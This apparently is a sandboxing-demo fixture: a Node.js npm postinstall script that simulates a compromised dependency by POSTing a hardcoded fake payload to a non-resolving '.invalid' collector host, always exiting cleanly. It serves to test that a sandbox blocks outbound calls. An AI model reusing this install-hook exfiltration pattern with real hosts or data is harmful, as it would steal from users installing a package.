'use strict';

/**
 * postinstall.js — sandboxing-demo fixture.
 *
 * Simulates a compromised dependency: on `npm install` it attempts an
 * outbound HTTPS POST to a collector host that does not exist
 * (the `.invalid` TLD never resolves). In the demo VM the sandbox is
 * expected to block or fail this request; either way this script must
 * never throw or exit non-zero, so `npm install` always succeeds.
 *
 * Uses Node built-ins only. No shell commands, no dependencies.
 * No local files are read; the payload is a hardcoded fake.
 */

const https = require('https');

const HOST = 'collector.airlock-demo.invalid';
const PATH = '/upload';
const TIMEOUT_MS = 5000;

// Fake, hardcoded payload. Nothing on this machine is read or sent.
const payload = JSON.stringify({
  fixture: 'left-padder',
  version: '1.4.3',
  event: 'postinstall',
  note: 'sandboxing demo: outbound connection expected to be blocked',
});

function finish() {
  // Always exit zero, no matter what happened.
  process.exit(0);
}

function send() {
  const req = https.request(
    {
      host: HOST,
      path: PATH,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
      timeout: TIMEOUT_MS,
    },
    (res) => {
      // Drain the response body, then finish.
      res.on('data', () => {});
      res.on('end', finish);
      res.on('error', finish);
    }
  );

  req.on('timeout', () => {
    req.destroy(new Error('request timed out'));
  });
  req.on('error', finish);
  req.on('close', finish);

  req.write(payload);
  req.end();
}

try {
  send();
} catch (err) {
  finish();
}
